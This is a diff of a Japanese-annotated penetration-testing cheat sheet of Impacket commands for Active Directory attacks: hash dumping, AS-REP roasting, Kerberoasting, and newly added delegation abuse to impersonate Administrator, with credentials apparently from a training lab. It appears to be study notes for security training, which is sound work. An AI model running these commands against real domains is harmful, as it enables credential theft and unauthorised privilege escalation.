@@ -12,6 +12,9 @@ impacket-secretsdump -sam <file> -system <file> LOCAL #SAMとsystemのハッシ�
 impacket-GetNPUsers.py <domain name>/<user name>　#TGTを不正に入手できるユーザの列挙、その後-requestオプションをつけてhashを入手
 impacket-GetNPUsers <domain>/ -dc-ip <IP> -usersfile user.txt -format hashcat -outputfile hash.txt -no-pass #パスワード認証なしでハッシュの入手を試みる
 
+findDelegation.py INLANEFREIGHT.LOCAL/carole.rose:jasmine
+getST.py -spn TERMSRV/DC01 'INLANEFREIGHT.LOCAL/beth.richards:B3thR!ch@rd$' -impersonate Administrator
+
 impacket-GetUserSPNs <domain name>/<user>:<pass> #kerberoastingの対象の列挙
 impacket-GetUserSPNs <domain name>/<user>:<pass> -dc-ip <IP> -request #TGSを入手 -request-user <user> で特定のユーザに絞れる
 
